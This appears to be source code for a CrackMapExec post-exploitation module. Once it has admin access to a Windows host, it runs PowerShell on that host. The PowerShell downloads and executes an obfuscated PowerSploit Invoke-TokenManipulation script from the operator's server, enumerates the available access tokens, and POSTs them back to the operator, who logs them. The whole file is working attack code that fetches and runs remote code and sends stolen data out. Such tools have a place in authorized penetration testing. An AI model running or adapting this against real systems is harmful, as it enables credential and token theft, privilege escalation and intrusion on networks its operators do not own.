from cme.helpers import create_ps_command, obfs_ps_script, gen_random_string, get_ps_script, write_log
from datetime import datetime
from StringIO import StringIO
import os
import sys

class CMEModule:
    '''
        Enumerates available tokens using Powersploit's Invoke-TokenManipulation
        Module by @byt3bl33d3r
    '''

    name = 'tokens'

    description = "Enumerates available tokens using Powersploit's Invoke-TokenManipulation"

    def options(self, context, module_options):
        '''
            USER      Search for the specified username in available tokens (default: None)
            USERFILE  File containing usernames to search for in available tokens (defult: None)
        '''

        self.user = None
        self.userfile = None

        if 'USER' in module_options and 'USERFILE' in module_options:
            context.log.error('USER and USERFILE options are mutually exclusive!')
            sys.exit(1)

        if 'USER' in module_options:
            self.user = module_options['USER']

        elif 'USERFILE' in module_options:
            path = os.path.expanduser(module_options['USERFILE'])

            if not os.path.exists(path):
                context.log.error('Path to USERFILE invalid!')
                sys.exit(1)

            self.userfile = path

        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-TokenManipulation.ps1');
        $creds = Invoke-{func_name} -Enumerate | Select-Object Domain, Username, ProcessId, IsElevated | Out-String;
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server,
                                          port=context.server_port,
                                          addr=context.localip,
                                          func_name=self.obfs_name)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-TokenManipulation.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data) > 0:

            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            context.log.success('Enumerated available tokens')

            if self.user:
                if data.find(self.user) != -1:
                    context.log.success("Found token for user {}!".format(self.user))
                    print_post_data(data)

            elif self.userfile:
                with open(self.userfile, 'r') as userfile:
                    for user in userfile:
                        user = user.strip()
                        if data.find(user) != -1:
                            context.log.success("Found token for user {}!".format(user))
                            print_post_data(data)
                            break

            else:
                print_post_data(data)

            log_name = 'Tokens-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))
